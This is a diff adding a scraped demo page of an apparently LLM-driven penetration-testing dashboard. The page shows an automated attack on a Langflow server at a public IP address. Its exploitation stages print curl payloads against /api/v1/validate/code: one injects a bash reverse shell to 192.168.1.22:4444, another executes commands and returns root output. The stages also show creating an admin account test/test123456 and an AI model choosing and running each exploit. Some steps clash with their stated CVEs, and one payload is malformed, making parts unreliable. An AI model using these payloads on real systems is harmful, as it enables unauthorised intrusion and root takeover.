@@ -1,0 +1,120 @@
+URL: https://trustchainai.ai2wj.com/pentest.html
+
+TrustChainAI
+⌘K
+K
+keen-otter-e854
+Guest
+▾
+Dashboard
+SCA Projects
+Pen Test Projects
+Risk Score
+Integrations
+Rules & Policy
+Pen Test
+›
+Langflow Platform
+›
+Full Attack — Auth Bypass + RCE
+Live Pen Test · LLM-driven Automated Penetration Testing
+Non-lateral · Zero Collateral Impact
+← Task List
+✎ Edit Config
+Re-run scan
+Download Report
+TARGET
+43.156.238.180:7860
+PROFILE
+⚡ Standard
+LLM MODEL
+Claude 3.5 Sonnet
+ROUNDS / TASKS
+5 rounds · 330 tasks
+WEB SEARCH
+ON
+ELAPSED
+41s
+▶ Live Demo
+📘 Summary Report
+✓
+INFO COLLECTION
+✓
+WEAKNESS GATHERING
+✓
+FILTERING
+✓
+ATTACK PLANNING
+✓
+EXPLOITATION
+🔍 STAGE 1 — INFORMATION COLLECTION
+Detected System:   Langflow Workflow Platform v1.2.0
+Frameworks:         React · Uvicorn (Python)
+Found APIs:         /login · /flow · /api/v1/...
+Critical Endpoint:  /api/v1/validate/code
+📡 STAGE 2 — WEAKNESS GATHERING
+Strategy:
+  — Langflow Workflow Platform CVE search
+  — React CVE search · Uvicorn CVE search
+
+✅ Using Exa + NVD feeds to find relevant public vulnerabilities...
+
+Results:  CVE-2025-68478, CVE-2025-68477, CVE-2025-57760, CVE-2025-34291,
+          CVE-2025-3248,  CVE-2025-68155, CVE-2025-67779, CVE-2025-6725,
+          CVE-2025-27519, CVE-2024-10906, CVE-2020-7695
+🎯 STAGE 3 — WEAKNESS FILTERING
+Filtered & Ranked Exploitable CVEs:
+
+  Critical  CVE-2025-3248   — Langflow RCE (unauthenticated)
+  High      CVE-2025-57760  — Privilege Escalation via CLI
+  High      CVE-2025-68155  — React XSS (filtered — patched in target)
+🧠 STAGE 4 — ATTACK DECISION (ROUND 1)
+LLM selected most promising weakness for exploitation:
+
+{
+  "weakness_to_exploit": "CVE-2025-57760",
+  "attack_intent":       "Add new superuser named 'test'"
+}
+⚔️ STAGE 5 — EXPLOIT GENERATION & EXECUTION
+$ curl -X POST http://43.156.238.180:7860/api/v1/validate/code \
+  -H "Content-Type: application/json" \
+  -d '{"code":"def foo(p=__import__(os).system(bash -i >& /dev/tcp/192.168.1.22/4444)):\n pass"}'
+
+$ /app/.venv/bin/langflow superuser
+Username: test
+Password: ········
+
+Default folder created successfully.
+Superuser created successfully.
+
+---  HTTP/1.1 200 OK
+{
+  "username":     "test",
+  "is_superuser": true
+}
+🧠 STAGE 4 — ATTACK DECISION (ROUND 2)
+Admin 'test' created — pivoting to RCE:
+
+{
+  "weakness_to_exploit": "CVE-2025-3248",
+  "attack_intent":       "Remote Command Execution as root"
+}
+⚔️ STAGE 5 — EXPLOIT GENERATION & EXECUTION (RCE)
+$ curl -X POST http://43.156.238.180:7860/api/v1/validate/code \
+  -H "Content-Type: application/json" \
+  -d '{"code":"@exec(\"raise Exception(subprocess.check_output([id]))\")
+def foo():
+  pass"}'
+
+---  HTTP/1.1 200 OK  ---
+{
+  "imports":  { "errors": [] },
+  "function": {
+    "errors": [ "uid=0(root) gid=0(root) groups=0(root)" ]
+  }
+}
+🏁 STAGE 4 — ATTACK DECISION (FINAL)
+🎯 Attack Success  New account test / test123456 with administrator privilege created
+🎯 Attack Success  Remote Command Execution confirmed — root shell obtained
+Root access confirmed — administrator test / test123456 created · RCE as uid=0(root)
+📝 Full technical details in Summary Report →
